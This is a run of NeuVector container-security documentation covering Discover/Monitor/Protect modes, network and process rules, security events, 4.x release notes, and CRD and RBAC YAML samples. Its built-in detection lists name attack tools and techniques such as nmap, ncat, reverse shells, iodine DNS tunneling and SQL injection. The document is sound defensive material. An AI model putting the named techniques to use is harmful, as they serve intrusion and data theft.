Group’s protection Mode based on elapsed time and criteria. This automation does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode.  The criterion for moving from Discover to Monitor mode is: elapsed time for learning all network and process activity of at least one live pod in the Group. For example, if this is set to 7 days, then 7 days after a running pod for the group is detected, the mode will be automatically promoted to Monitor.  The criterion for moving from Monitor to Protect mode is: there are no security events (network, process etc) for the timeframe set for the Group. For example, if this is set to 14 days, then if no violations (network, process, file) are triggered for 14 days (e.g. the quiet period), then the mode is automatically promoted to Protect. If there are no running pods in the group, the promotion will not occur.

For ICMP traffic, enter icmp.  note To select Any/All, leave this field blank  Deny/Allow  Indicate whether this rule is to Allow this type of connection, or Deny it.  If Deny is selected, NeuVector will log this as a violation while in Monitor mode, and will block this while in Protect mode. The default action is to Deny a connection (log violation only if in Monitor mode) if no rule matches it.  Don’t forget to Deploy/Update if you make any changes!  ","version":"Next 🚧","tagName":"h3"},{"title":"Egress Control: Allowing Connections to Trusted Internal Services on Other Networks​","type":1,"pageTitle":"Network Rules","url":"/next/policy/networkrules#egress-control-allowing-connections-to-trusted-internal-services-on-other-networks","content":" A common use case for customizing rules is to allow a container service to connect to a network outside of the NeuVector managed cluster’s network. In many cases, since NeuVector does not recognize this network it will classify it as an ‘External’ network, even if it is an internal network.  To allow containers to connect to services on other internal networks, first create a group, then a rule for it.  Create a Group. In Policy -&gt; Groups, click to add a new Group. Name the group (e.g. internal) then specify the criteria for the group. For example, specify the DNS name, IP address or address range of the internal services. Save the new group. Create a Rule. In Policy -&gt; Rules, click to add a new rule. Select the group representing the container From which the connections will originate, then the To group (e.g. internal). You can further refine the rule with specific protocols or ports, or leave blank. Make sure the selector is set to Allow (green).  Be sure to click Deploy to save the new rule.  Finally, review the list of rules to make sure the new rule is in the order and priority desired. Rules are applied from top to bottom.  Ingress IP Policy Based on X-FORWARDED-FOR​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Special Enforcement for Istio ServiceEntry Destinations​  Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. Implicit violations will be reported for newly visible traffic if allow rules don't exist. These rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with destination addresses (or DNS name) and add a new network rule to this destination to allow the traffic.  Virtual Host Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.

Groups​  This provides the primary view of service Groups and custom Groups to set the mode (Discover, Monitor, Protect) for each service and to manage rules. Groups are automatically created by NeuVector, but custom groups can be added. Rules for each Group are automatically created by NeuVector when containers begin running. Container Groups can have a Split Policy Mode where the Process/File rules are in a different enforcement mode than the Network rules, as described here.  To select a Group to view or manage, select the check box next to it. This is where Process Profile Rules, File Access Rules, DLP, and Custom Compliance checks are managed. Network Rules can be viewed here but are managed in a separate menu. Network and Response Rules in NeuVector are created using a ‘from’ and ‘to’ field, which requires a Group as input. A group can be an application, derived from image labels, DNS name or other customized grouping. DNS subdomains are supported, e.g. *.foo.com. IP addresses or subnets can also be used which is useful to control ingress and egress from non-containerized workloads.    Reserved group names created automatically by NeuVector include:  Containers. All running containers.External. Connections coming into the cluster (ingress).Nodes. Nodes or hosts identified by NeuVector.  The Groups menu is also where the &quot;Export Group Policy&quot; can be performed. This exports the security policy (rules) for the selected groups as a yaml file in the format of the NeuVector custom resource definition (CRD) which can be reviewed and then deployed into other clusters.  Note that the Status of a Group's containers is shown in Policy -&gt; Groups -&gt; Members, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Network Rules​  A list of whitelist and blacklist rules for NeuVector to enforce. NeuVector can auto-discover and create a set of whitelist rules while in Discover mode. Rules can be added manually if desired.  NeuVector automatically creates Layer 7 (application layer) whitelist rules when in Discover mode, by observing the network connections and creating rules which enforce application protocols.  NeuVector also has built-in network attack detection which is enabled all the time, regardless of mode (Discover, Monitor, Protect). The network threats detected include DDoS attacks, tunneling and SQL injection. Please see the section Network Rules for a full list of built-in threat detection.  DLP (Data Loss Prevention) rules can also be applied to container Groups to inspect the network payload for potential data stealing or privacy violations such as unencrypted credit card data. Violations can be blocked. Please see the section on DLP for details on how to create and apply DLP filters.  Process Profile and File Access Rules​  NeuVector has built-in detection of suspicious processes and file activity as well as a baselining technology for containers. Built-in detection includes processes such as port scanning (e.g. NMAP), reverse shell, and even privilege escalations to root. System files and directories are automatically monitored. Each service discovered by NeuVector will create a baseline of ‘normal’ process and file behavior for that container service. These rules can be customized if desired.  Response Rules​  Response Rules enable users to define actions to respond to security events. Events include Threats, Violations, Incidents, and Vulnerability Scan results. Actions include container quarantine, webhooks, and suppression of alerts.  Response Rules provide a flexible, customizable rule engine to automate responses to important security events.  Admission Control Rules​  Admission control rules allow or block deployments. More details can be found in this section under Admission Controls.  DLP and WAF Sensors​  Data Loss Prevention (Data Leak Protection) and WAF rules can be enabled on any selected container Group. This utilizes Deep Packet Inspection to apply regular expression based matching to the network payload entering or leaving the selected container group. Built-in sensors for credit card and US social security number are included for examples, and custom regular expressions can be added.  Migration, Backup, Import/Export​  Migration of the security policy can be accomplished by CRD, REST API, or import/export. For example, learned and custom rules can generate a CRD yaml file(s) in a staging environment for deployment to the production environment.  The Security Policy for NeuVector can be exported and imported in Settings -&gt; Configuration. It is recommended to backup All configuration prior to any update of NeuVector to a new version.  important Importing ALL (Config and Policy) will overwrite everything, including the main admin login credential. Be sure you know the main admin login for the imported file before importing.

One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  note There is a limitation when running on systems with the AUFS file system, whereby a race condition can be experienced and the process rules are not enforced for blocking (Protect mode). However, these violations are still reported in the security event logs.  Zero-drift Process Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic Mode Process Protection​  Zero-drift can be disabled, switching to Basic process protection. Basic protection enforces process/file activity based on the listed process and/or file rules for each Group. This means that there must be a list of process rules and/or file rules in place for protection to occur. Rules can be auto-created through Behavioral Learning while in Discover mode, manually created through the console or rest API, or programmatically created by applying a CRD. With Basic enabled if there are no rules in place, all activity will be alerted/blocked while in Monitor or Protect modes.  Behavioral Learning Based Process Protection​  Process profile rules use baseline learning to profile the processes that should be allowed to run in a group of containers (i.e. a Group). Under normal conditions in a microservices environment, for containers with a particular image, only a limited set of processes by specific users would run. If the container is attacked, the malicious attacker would likely initiate some new programs commonly not seen in this container. These abnormal events can be detected by NeuVector and alerts and actions generated (see also Response Rules).  Process baseline information will be learned and recorded when the service Group is in Discover (learning) mode. When in Monitor or Protect mode, if a process that has not been seen before is newly started, or an old process is started by a different user than before, the event will be detected and alerted as a suspicious process in Monitor mode or alerted and blocked in Protect mode. Users can modify the learned profile to allow or deny (whitelist or blacklist) processes manually if needed.  Note that in addition to baseline processes, NeuVector has built-in detection of common suspicious processes such as nmap, reverse shell etc. These will be detected and alerted/blocked unless explicitly white listed for each container service.  important Kubernetes liveness probes are automatically allowed, and added to the learned process rules even in Monitor/Protect mode.  Process Rules for Nodes​  The special reserved group 'nodes' can be configured to enforce process profile rules on each node (host) in the cluster. Select the group 'nodes' and review the process rules, editing if required. Then switch the protection mode to Monitor or Protect. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  Process Rules for Custom Groups​  For user defined custom Groups, process rules, if desired, must be manually added. Custom Groups do not learn process rules automatically.  Process Rules Precedence​  Process rules can exist for user defined custom Groups as well as auto-learned Groups. Rules created for custom Groups take precedence over rules for auto-learned Groups.  For the process rule list within any Group, the rule order in the console determines its precedence. The top rules listed are matched first before the ones below it.  Process rules with name and path both containing wildcards take precedence over other rules to Allow action. A Deny action is not allowed with both wildcards to avoid blocking all processes.  Process rules with a Deny action and wildcard in the name will take precedence over Allow actions with wildcard in the name.  Discover mode​  All new processed are profiled with action allowUsers can change the action into 'deny' for generating alert or blocking when same new process is startedUsers can create a profile for a process with either allow or denyProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  note A suspicious process (built-in detect), such as nmap, ncat, etc., is reported as a suspicious process event and will NOT be learned. If a service needs this process, the process needs to be added with an 'allow' profile rule explicitly.  Monitor/Protect mode (new container started in monitor or protect mode)​  Every new process generates an alertProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  If a) process matches a deny rule, or b) process is not in the list of allow rules, then:  In Monitor mode, alerts will be generatedIn Protect mode, processes will be blocked and alerts generated  note Container platforms with the AUFS storage driver will introduce a delay in blocking mechanism due to the driver’s limitations.  note In Protect mode, system containers such as Kubernetes ones, will not enable the block action but will generate a process violation event if there is a process violation.  Creating process profile rules​  Multiple rules can be created for the same process. The rules are executed sequentially and the first matching rule will be executed.  Click Add rule (+) from process profile rules tabProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  Example: To allow the ping process to run from any directory    Violations will be logged in Notifications -&gt; Security Events.

Notifications can be downloaded as CSV or PDF from the Notifications menus. In addition, packet captures can be downloaded for network attacks, and vulnerability results can be downloaded from the Notifications -&gt; Risk reports menu for each scan result.  You can also display the logs using the CLI or REST API.  Security Events​  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Network violations are captured and source IPs can be investigated further. Whitelist network violation events show up as &quot;Implicit Deny Rule is Violated&quot; to indicate the network connection did not match any whitelist rule.    In this view, you can review network, process, and file events and easily add a whitelist rule for false positives by clicking the Review Rule button. The Advanced Filter enables you to select the type of event to display.    NeuVector also continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:    Add New Rules for Security Events  You can easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.    This is useful if false positives occur or a network/process behavior should have been discovered but did not occur during the Discover mode.  Advanced Filters  Create an advanced filter for viewing or exporting events by selecting each general type or entering keywords.  Network. Network events such as violations (implicit deny rules), threats.Process. Process whitelist violations or suspicious processes detected such as NMAP, SSH etc.Package. A package has been updated or installed in the container therefore this generated a security event.Tunnel. A tunnel violation has been detected. Tunneling, typically dns tunneling is used to steal data. This detection is done by seeing a tunnel process start and correlating it with a network activity with dns protocol. See sample event below. Description of iodine tunnel https://github.com/yarrick/iodineFile. File access violation. Either a monitored sensitive file/directory has been accessed (see list of default monitoring, or a custom file monitor rule has been triggered. https://docs.neuvector.com/policy/filerulesPrivilege. A privilege escalation has been detected in container or host. Privilege escalations can be done in many ways and are not 100% detectable so this is a difficult condition to test.

This is related to a function added in 4.1.1 to add support for x-forwarded-* headers. To disable, go to Settings -&gt; Configuration. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR below.  Bug Fixes​  Fixed that CVE-2020-1938 is not detected.Fix error from Manager &quot;Failed to export configurations of section {policy, user, config}.&quot;Fix Network Activity Graph filter is not working.Improve controller CPU and memory consumption.  Other​  Jenkins plug-in updated to support stand alone scanner. Please see release notes section Integrations &amp; Other Components for details.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;  Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. In 4.1.0 release, we added a feature to recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  In 4.1.2, switch is added to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.    4.1.1 January 2021​  Bug Fixes​  Add support for AWS EKS AMI Release v20210112 to fix ulimit issues.  4.1 December 2020​  Enhancements​  Allow users to change policy mode when exporting CRD.OIDC support claims from /oauth/userinfo endpoint.Cluster node refresh support to allow temporary support for node growth and migration of pods between nodes.Generate a usage report for download from the Settings -&gt; Configuration page.Wildcard support on namespace when assigning user roles to namespace.Improve group/policy removal logic.

This is not required (Controller will create these automatically). Helm deployment will also take care of these.  Bug Fixes​  Improve high memory usage on controller and enforcer.Error returned when trying to configure a registry filter. Allow wildcard be used any place in the repo/tag filter.Block policy not working as expected. Add support for x-forwarded-* headers. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR above as part of the 4.1.2 release notes.Helm Chart error when setting controller ingress to true.Unable to create add and save network rule, due to gateway timeout.Configmap examples are missing Group_Claim field. Added to configmap documentation.Process profile violation when terminating Controller pod.  Scanner Details​  Two additional environment variables are added in order to login to controller REST API. Users with CICD integration role can submit the results.  New Environment Variables: SCANNER_CTRL_API_USERNAME, SCANNER_CTRL_API_PASSWORD  Usage Example  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_LICENSE=$license -e CLUSTER_JOIN_ADDR=10.1.2.3 CLUSTER_JOIN_PORT=32368 -e SCANNER_CTRL_API_USERNAME=username -e SCANNER_CTRL_API_PASSWORD=secret -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   Kubernetes 1.19+ and CRD Exports​  important To use an exported CRD with Kubernetes 1.19+, please remove the 'version: v1' from each section. This can be found at the end or near the end of each section in an exported Group policy CRD.   version: v1   4.0.3 December 2020​  Bug Fixes​  Process profile violation occurring when terminating Controller pod.Implicit violations for user created address group which uses wildcard in hostnames.  Helm Chart Changes​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.Create a separate chart for CRD. This allows CRD policies to be created before NeuVector core services are deployed. If the new chart is used, the CRD resources in the core chart, kept for backward compatibility, should be disabled with crdwebhook.enabled=falseAllow user to specify the service account for NeuVector deployment. Previously, the 'default' service account of the namespace is used. In the case when NeuVector is deployed together with other applications in a namespace, it is not advisable to use the default service account for the namespace for some users.  4.0.2 December 2020​  Enhancements​  Console - the container list page Assets -&gt; Containers should allow the window separators to be dragged to be resized.Add admission control checks for pod share host namespaces. Allow user to choose to prevent pod from sharing host's Network, IPC, PID namespaces. See below for more details.Ability to export list of containers running in privileged or 'runasroot'.In Notifications -&gt; Security Events, enable the display of information about the event attributes easily without switching screens.  Bug Fixes​  Issue with jumbo frames (enabled on some public clouds). Symptom: the main prometheus application URI /graph becomes inaccessible when the prometheus group is placed into Protect mode.Missing namespace option in vulnerabilities filter. Allow users to select/type the Namespace where NeuVector is installed as filter entry.False positive in OpenSSL version 1.1.1c-1 affected by CVE-2020-1967.Unexpected implicit deny violations for user created address group using wildcard hostnames. Problems with using DNS Name (with wildcards) for Firewall Traffic.Improve detection to remove SQL Injection false positive.  Admission Control for Pod Sharing​  HostPID - Controls whether the pod containers can share the host process ID namespace. Note that when paired with ptrace this can be used to escalate privileges outside of the container (ptrace is forbidden by default).HostIPC - Controls whether the pod containers can share the host IPC namespace.HostNetwork - Controls whether the pod may use the node network namespace. Doing so gives the pod access to the loopback device, services listening on localhost, and could be used to snoop on network activity of other pods on the same node.  4.0.1 November 2020​  important Changes to Helm Chart Structure The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/ If using Helm to upgrade, please update the location to the path above.  Enhancements​  Add support for distroless image scanning.Add ability to trigger single image scan from registry with results available for admission control.Update JFrog Xray integration to new JFrog platform api / authentication requirements.Add information about scanners in the Manager such as version and scanner statistics.Add quick filter to exclude security events (similar to grep -v).Update CVE Severity to align with NVD vulnerability severity ratings. Using the larger of the CVSS v2 and v3 scores, the ratings are High for &gt;=7, Medium for &gt;=4.Support standalone scanner deployments for local image scanning (does not require controller). Adds new environment variables SCANNER_LICENSE, SCANNER_REGISTRY, SCANNER_REPOSITORY, SCANNER_TAG, SCANNER_REGISTRY_USERNAME, SCANNER_REGISTRY_PASSWORD, SCANNER_SCAN_LAYERS, CLUSTER_JOIN_ADDR, CLUSTER_JOIN_PORT.Support namespace auto-complete for namespace user creation in Settings -&gt; Users.Add ability to enter exempted CVEs in the Jenkins scanner plug-in.Add admission control criteria to be able to block images for which the scan failed to detect the OS (e.g. archlinux images) and therefore no vulnerabilities were found. A new criteria &quot;Image Without OS information&quot; is added, when set to true, means the base OS of the image is unavailable.  Bug Fixes​  Improve (decrease) Controller memory usage.Enable support for webhook functions such as admission control and CRD in Kubernetes 1.19.Add support for apiextensions.k8s.io/v1 deployments as required for Kubernetes 1.19 (and supported in k8s 1.18).Unexpected process profile rule violation resulting from parent shell script for process on the allowed list.Add support for wildcard filters in Harbor registry (configured using Docker registry setting).Improve handling of configmap to re-load if admin password is reverted to the default. This is to prevent insecure access when the system is recovered from cluster level storage failure.  4.0.0.s1 October 2020​  Security Patch for NeuVector Containers​  This security release is for the NeuVector Manager and Allinone containers to address High CVE-2020-14363 found in the base Alpine layer in package libx11. As part of the update, Medium CVE-2020-8927 is also addressed. This issue, although unlikely to be able to be exploited, affects the Manager console for NeuVector and does not affect the operations of the Controller or Enforcer containers.  4.0 September 2020​  Enhancements​  Customizable compliance templates. Preset templates for PCI, GDPR, HIPAA, NIST. Each CIS benchmarks and custom check can be tagged with one or more compliance regulations. Reports can then be generated for each. Security Risks -&gt; Compliance Profile.Vulnerability Management Workflow Support. Track status of vulnerabilities and create policies based on vulnerability discovery dates and other criteria. Security Risks -&gt; Vulnerabilities (Advanced Filter), and Admission Control rules.Secrets auditing. 20+ secrets checks included, and automatically run on image scans and resource yamls. Results will show pass/warn in the compliance reports on image vulnerabilities in Assets -&gt; Registries and Security Risks -&gt; Compliance.Granular RBAC for NeuVector Users. Create custom roles with granular read/write permissions for NeuVector functions. Assign users to roles. Settings -&gt; Users/Roles.Scalable and Separated Scanner Pods. Scanner pods can be scaled up or down to scan thousands of images. The controller assigns scanning tasks to each available scanner pod. Important: the Controller no longer contains a scanner function, so a minimum of one scanner pod is required to be deployed. Also, the 4.x scanners are NOT backward compatible with 3.x controllers, 3.x deployments of external scanners should be updated to neuvector/scanner:3.Serverless Scanning and Risk Assessment for AWS Lambda. Scan AWS Lambda functions for vulnerabilities with the Serverless IDE Plug-in or in AWS accounts. Supported languages include Java, Python, Ruby, node.js. Perform risk assessment by evaluating IAM role permissions for Lambda functions and alert if unnecessary permissions are enabled. Note: Serverless security requires a separate NeuVector license.Perform compliance checks during image scanning. Also deployment yamls file. This includes setuid, setgid, CIS (running as root etc), 20+ secrets checks.Enhance Security Risk Score in Dashboard with ability to enable/disable which Groups contribute to the Risk Score. Policy -&gt; Groups -&gt; Scorable check box. This includes ability to disable system containers from risk scoring.Added support for a Namespace restricted user to have access to assigned registries.Break out scanning syslog notifications to individual CVE syslog events.Allow a namespace restricted user to be able to create registries that are only visible by users that have access to that namespace (including global users).Download pdf reports from the dashboard by namespace. Select a namespace to filter the dashboard pdf report.The CRD import behavior has been changed to ignore the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration. A 'linked' group is one which has not been selected for export but is referred to by a network rule, and thus has been exported along with the selected group(s).  Bug Fixes​  Registry URL validation allows URL without protocol scheme prefix. Added protocol schema validation.Container scans failed - Fail to read files in some situations. Fixes error &quot;Failed to read file - error=&lt;nil&gt;&quot;.The Group member column is inaccurate for the special group &quot;nodes.&quot;Discount (reduce) Admission Controls (4 points) from Overall Risk Scoring for Docker EE Platform since it is not applicable.A scanner only controller can take 15-20 minutes to become ready.Security risks &gt; Vulnerabilities &quot;Severity&quot; Distribution title is mislabeled as Urgency.Security Events source Workload:ingress rule does not match. Unexpected implicit violation from Workload:Ingress on OpenShift 3.11 platform. Internal subnet logic is improved to handle large IP range.Enforcer reports error trying to connect to /var/run/docker.sock. Add recovery if connection is lost.  Summary of Major Operational Changes​  The 4.x Scanner is NOT compatible with the 3.2.0, 3.2.1, 3.2.2 Controllers. If you have deployed 3.x external scanners and wish to have them continue to run, be sure to UPDATE the scanner deployment with a version 3 tag, e.g. neuvector/scanner:3. Alternatively, you can update to 3.2.3+.License to enable serverless security requiredNew clusterolebinding and clusterrole added for Kubernetes an OpenShiftController no longer has built in scanner.

Developers, DevOps, DevSecOps, and Security teams can collaborate to automate security policies for new or updated applications deployed to production. CRDs can also be used to enforce global security policies across multiple Kubernetes clusters.  note CRDs are supported in Kubernetes 1.11 and later. Deploying the NeuVector security rule CRD in earlier versions may not result in an error, but the CRD will not be processed.  CRD's can be used to support many use cases and workflows:  Define security policy during application development, to push into production.Learn behavior using NeuVector and export the CRD for review before pushing into production.Migrate security policies from staging to production clusters.Replicate rules across multiple replicated clusters in hybrid or multi-clouds.Enforce global security policies (see examples for this at bottom).  CRD's bring many benefits, including:  Define / declare the security policy, as code.Version and track the security policies the same as application deployment manifests.Define the allowed behavior of any application including network, file and process behavior.  Supported Resource Types​  NeuVector supports two kinds of custom resource definitions. They are the NvSecurityRule and NvClusterSecurityRule. The difference among the two comes down to the boundary set by the definition of the scope. The NvSecurityRule resource is scoped at the namespace level, whereas the NvClusterSecurityRule is scoped at the cluster level. Either of the resource types can be configured in a yaml file and can be created during deployment, as shown in the deployment instructions and examples for NeuVector.  The significance of the NvSecurityRule resource type with a scope of namespace lies in the enforcement of the configured domain of the target group, which must match the configured namespace in the NeuVector’s CRD security policy. This provides enforcement to prevent unwanted cross-namespace policy creation which affect a Target-Group policy rule.  For the NvClusterSecurityRule custom resource definition, this has a cluster level scope, and therefore, does not enforce any namespace boundary on a defined target. However, the user-context that is used for importing the CRD-yaml file must have the necessary permissions to access or reside in the same namespace as the one configured in the CRD-yaml file, or the import will be rejected.  Enabling CRD SupportAs described in the Kubernetes and OpenShift deployment sections (Deploying NeuVector), the appropriate clusterroles and clusterrole bindings for custom resources and NvSecurityRules should be added first.  Then NvSecurityRule and NvClusterSecurityRule should be created using the sample yaml in those sections. NeuVector CRDs can now be deployed.

This configured Namespace is then used to enforce the configured Target, which must reside in this namespace configured in the NeuVector security policy. When rolebinding a defined clusterrole, this can be used to bind to a Kubernetes User or Group. The two clusterrole resources types that NeuVector supports are NvSecurityRule and NvClusterSecurityRule.  Rolebinding &amp; Clusterolebinding with 2 Users in different Namespaces to a Clusterrole (NvSecurityRules &amp; NvClusterSecurityRules resources)  The following illustrates a scenario creating one Clusterrole containing both resources (NvSecurityRules and NvClusterSecurityRules) to be bound to two different users.  One user (user1) belongs to Namespace (ns1), while the other user (user2) belongs to Namespace (ns2). User1 will Rolebind to this created Clusterrole (nvsecnvclustrole), while User2 is Clusterrolebind to this same Clusterrole (nvsecnvclustrole).  The key takeaway here is to illustrate that using Rolebinding, this will have Namespace-Level-Scope, whereas using Clusterrolebinding will have Cluster-Level-Scope. User1 will Rolebind (Namespace-Level-Scope), and User2 will be Clusterrolebind (Cluster-Level-Scope). This matters most during RBAC enforcement based on the scope-level that bounds the created users access.  Example using 2 different types of defined yaml files, and the effect of using each user  Create a Clusterrole containing both NvSecurityRules and NvClusterSecurityRules resources. Note: Notice that this clusterrole has 2 resources configured, nvsecurityrules and nvclustersecurityrules. Example (nvsecnvclustroles.yaml):  apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: nvsecnvclustrole rules: - apiGroups: - neuvector.com resources: - nvsecurityrules - nvclustersecurityrules verbs: - list - delete - create - get - update - apiGroups: - apiextensions.k8s.io resources: - customresourcedefinitions verbs: - get - list   Create 2 test yaml-files. One for the NvSecurityRules, and the other for the NvClusterSecurityRules resource. Sample NvSecurityRules nvsecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1crd namespace: ns1 spec: target: selector: name: nv.nginx-pod.ns1 criteria: - key: service value: nginx-pod.ns1 op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: domain value: demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Sample NvClusterSecurityRules nvclustersecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: rbacnvclustmatchnamespacengtargserving namespace: nvclusterspace spec: target: policymode: Protect selector: name: nv.nginx-pod.eng criteria: - key: service value: nginx-pod.eng op: &quot;=&quot; - key: domain value: eng op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: service value: nginx-pod.demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Switching the user-context to user1 (belongs to the ns1 Namespace) has a Rolebind to the NvSecurityRules resource, who is Namespace bound to the Namespace ns1. Therefore, importing test yaml file (kubectl create –f nvsecurity.yaml should be allowed since this yaml file configuration has the NvSecurityRules resource and the Namespace that this user is bound to.  If there is an attempt to import the test yaml file (nvclustersecurity.yaml ) however, this will be denied since the import CRD yaml file is defined with the resource NvClusterSecurityRules that has a Cluster-Scope, but user1 was Rolebind with a Namespace-Scope. Namespace-scope has a lower privilege than Cluster-Scope. Therefore, Kubernetes RBAC will deny such a request.  Example Error Message:  Error from server (Forbidden): error when creating &quot;rbacnvclustnamespacengtargnvclustingress.yamltmp&quot;: nvclustersecurityrules.neuvector.com is forbidden: User &quot;user1&quot; cannot create resource &quot;nvclustersecurityrules&quot; in API group &quot;neuvector.com&quot; at the cluster scope   Next, we can switch the user-context to user2 with a broader scope privilege, cluster-level-scope. This user2 has a Clusterrolebinding that is not Namespace bound, but has a cluster-level-scope, and associates with the NvClusterSecurityRules resource.  Therefore, using user2 to import either yaml file (nvsecurity.yaml or nvclustersecurity.yaml) will be allowed, since this user’s Clusterrolebinding is not restricted to either resource NvSecurityRules (Namespace-Scope) or NvClusterSecurityRules (Cluster-Scope).

Each network rule in NeuVector must have a unique name in a CRD. Note that in the console, network rules only have a unique ID number.  If the 'To' (destination) of the rule is a learned, discovered group, upon export NeuVector prepends the 'nv.' identifier to the name. For example &quot;nv.redis-master.demo-ingress-0&quot;. For both discovered and custom groups, NeuVector also appends a unique name identifier, such as '-ingress-0' in the rule name 'nv.redis-master.demo-ingress-0. For CRD rule names, the 'nv.' identifier is NOT required, and is added to exported rules for clarity. For example:   ingress: - action: allow applications: - Redis name: nv.redis-master.demo-ingress-0   Custom, user created groups are not allowed to have the 'nv.' prefix. Only discovered/learned groups with the domain and service objects should have the prefix.

